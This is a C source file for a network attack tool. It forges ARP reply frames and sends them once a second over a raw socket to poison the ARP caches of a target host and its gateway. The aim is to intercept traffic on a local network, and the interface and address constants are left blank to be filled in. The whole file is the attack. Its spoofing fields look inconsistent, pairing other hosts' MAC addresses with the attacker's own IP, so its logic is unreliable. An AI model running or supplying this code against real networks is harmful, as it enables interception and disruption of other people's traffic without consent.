#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <pthread.h>

//  input your network interface 
#define INTERFACE ""

//  input your network information
#define MY_IP ""
#define MY_MAC "" 
#define TARGET_IP ""    
#define TARGET_MAC "" 
#define GW_IP ""
#define GW_MAC ""

void target_arp_poisoning();    //  arp poisoning to target
void gateway_arp_poisoning();   //  arp poisoning to gateway
void send_arp_packet(const uint8_t *packet);    //  arp packet send
void* poison(void *arg);        //  function to be used finally to poison

int main() {
    pthread_t poison_thread;    //  make thread
    pthread_create(&poison_thread, NULL, poison, NULL);     //  input a function to use as a thread

    //  prevent the main thread from ending first
    while(1){}
    return 0;
}

//  arp poisoning to target
void target_arp_poisoning(){
    uint8_t packet[ETH_FRAME_LEN];  //  make packet array
    struct ether_header *eth;       //  make ethernet header;
    struct ether_arp *arp;          //  make arp header

    memset(packet, 0, ETH_FRAME_LEN);   //  initialize packet to zero 
    eth = (struct ether_header *)packet;    //  convert packet to ethernet header format
    
    //  input destination mac address in ethernet header
    sscanf(TARGET_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &eth->ether_dhost[0], &eth->ether_dhost[1], &eth->ether_dhost[2],
        &eth->ether_dhost[3], &eth->ether_dhost[4], &eth->ether_dhost[5]);

    //  input source mac address in ethernet header
    sscanf(MY_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &eth->ether_shost[0], &eth->ether_shost[1], &eth->ether_shost[2],
        &eth->ether_shost[3], &eth->ether_shost[4], &eth->ether_shost[5]);

    //  specify ethernet type as arp
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp = (struct ether_arp *)(packet + sizeof(struct ether_header));   //  convert packet to arp header format
    arp->arp_hrd = htons(ARPHRD_ETHER);     //  specify layer 2 as ethernet
    arp->arp_pro = htons(ETH_P_IP);     //  specify layer 3 as IP
    arp->arp_hln = ETH_ALEN;    //  specify layer 2 address length             
    arp->arp_pln = sizeof(in_addr_t);   //  specify layer 3 address length
    arp->arp_op = htons(ARPOP_REPLY);   //  specify arp message type

    //  input IP, MAC address in packet, but we are doing poisoning. so specify arp->sha as gateway mac address
    sscanf(GW_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &arp->arp_sha[0], &arp->arp_sha[1], &arp->arp_sha[2],
        &arp->arp_sha[3], &arp->arp_sha[4], &arp->arp_sha[5]);
    
    inet_pton(AF_INET, MY_IP, &arp->arp_spa);

    sscanf(TARGET_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &arp->arp_tha[0], &arp->arp_tha[1], &arp->arp_tha[2],
        &arp->arp_tha[3], &arp->arp_tha[4], &arp->arp_tha[5]);
    
    inet_pton(AF_INET, TARGET_IP, &arp->arp_tpa);

    //  call send_arp_packet function
    send_arp_packet(packet);
}

//  arp poisoning to gateway
void gateway_arp_poisoning(){
    uint8_t packet[ETH_FRAME_LEN];  //  make packet array
    struct ether_header *eth;       //  make ethernet header;
    struct ether_arp *arp;          //  make arp header

    memset(packet, 0, ETH_FRAME_LEN);   //  initialize packet to zero 
    eth = (struct ether_header *)packet;    //  convert packet to ethernet header format

    //  input destination mac address in ethernet header
    sscanf(GW_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &eth->ether_dhost[0], &eth->ether_dhost[1], &eth->ether_dhost[2],
        &eth->ether_dhost[3], &eth->ether_dhost[4], &eth->ether_dhost[5]);

    //  input source mac address in ethernet header
    sscanf(MY_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &eth->ether_shost[0], &eth->ether_shost[1], &eth->ether_shost[2],
        &eth->ether_shost[3], &eth->ether_shost[4], &eth->ether_shost[5]);        
            
    //  specify ethernet type as arp        
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp = (struct ether_arp *)(packet + sizeof(struct ether_header));      //  convert packet to arp header format
    arp->arp_hrd = htons(ARPHRD_ETHER);     //  specify layer 2 as ethernet
    arp->arp_pro = htons(ETH_P_IP);     //  specify layer 3 as IP
    arp->arp_hln = ETH_ALEN;    //  specify layer 2 address length  
    arp->arp_pln = sizeof(in_addr_t);   //  specify layer 3 address length
    arp->arp_op = htons(ARPOP_REPLY);   //  specify arp message type

    //  input IP, MAC address in packet, but we are doing poisoning. so specify arp->sha as gateway mac address
    sscanf(TARGET_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &arp->arp_sha[0], &arp->arp_sha[1], &arp->arp_sha[2],
        &arp->arp_sha[3], &arp->arp_sha[4], &arp->arp_sha[5]);

    inet_pton(AF_INET, MY_IP, &arp->arp_spa);
    
    sscanf(GW_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &arp->arp_tha[0], &arp->arp_tha[1], &arp->arp_tha[2],
        &arp->arp_tha[3], &arp->arp_tha[4], &arp->arp_tha[5]);
    
    inet_pton(AF_INET, GW_IP, &arp->arp_tpa);

    //  call send_arp_packet function
    send_arp_packet(packet);
}

//  function that actually sends packets
void send_arp_packet(const uint8_t *packet){
    int sock;
    struct sockaddr_ll addr;

    //  make raw socket
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket() error");
        exit(1);
    }

    //  socket addressing
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = if_nametoindex(INTERFACE);   //  specify network interface
    addr.sll_halen = ETH_ALEN;
    sscanf(MY_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &addr.sll_addr[0], &addr.sll_addr[1], &addr.sll_addr[2],
        &addr.sll_addr[3], &addr.sll_addr[4], &addr.sll_addr[5]);

    //  send packet
    if (sendto(sock, packet, ETH_FRAME_LEN, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("sendto() error");
        exit(1);
    }

    //  close socket
    close(sock);    
}

//  function that actually poisoning
void *poison(void *arg){
    while (1) {
        target_arp_poisoning();
        gateway_arp_poisoning();
        printf("ARP response sent!\n");
        sleep(1);
    }
}